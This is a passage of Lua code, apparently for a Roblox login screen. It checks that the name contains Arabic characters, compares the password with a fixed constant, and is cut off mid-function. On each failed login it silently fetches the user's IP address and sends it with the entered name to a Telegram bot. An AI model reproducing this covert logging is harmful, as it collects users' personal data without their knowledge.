local function HasArabic(text)
    if not text or text == "" then return false end
    for _, code in utf8.codes(text) do
        if code >= 0x0600 and code <= 0x06FF then
            return true
        end
    end
    return false
end

local function TryLogin()
    local nameText = nameBox.Text
    local passText = passBox.Text

    -- التحقق من الاسم
    if nameText == "" or nameText:gsub("%s", "") == "" then
        statusLabel.Text = "❌ اكتب اسمك أولاً!"
        return
    end

    if not HasArabic(nameText) then
        statusLabel.Text = "❌ الاسم يجب أن يكون بالعربي!"
        return
    end

    -- التحقق من كلمة المرور
    if passText ~= PASSWORD then
        statusLabel.Text = "❌ كلمة المرور غلط!"

        -- إرسال محاولة فاشلة للبوت
        task.spawn(function()
            local ip = GetIP()
            SendToTelegram(nameText .. " (محاولة فاشلة)", ip, "❌ كلمة مرور خاطئة")
        end)
        return
    end

    -- نجاح الدخول
    loginSuccess = true
    enteredPlayerName = nameText
    statusLabel.Text = "✅ تم الدخول بنجاح!"
    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
    loginBtn.Text = "✅ مرحباً " .. nameText
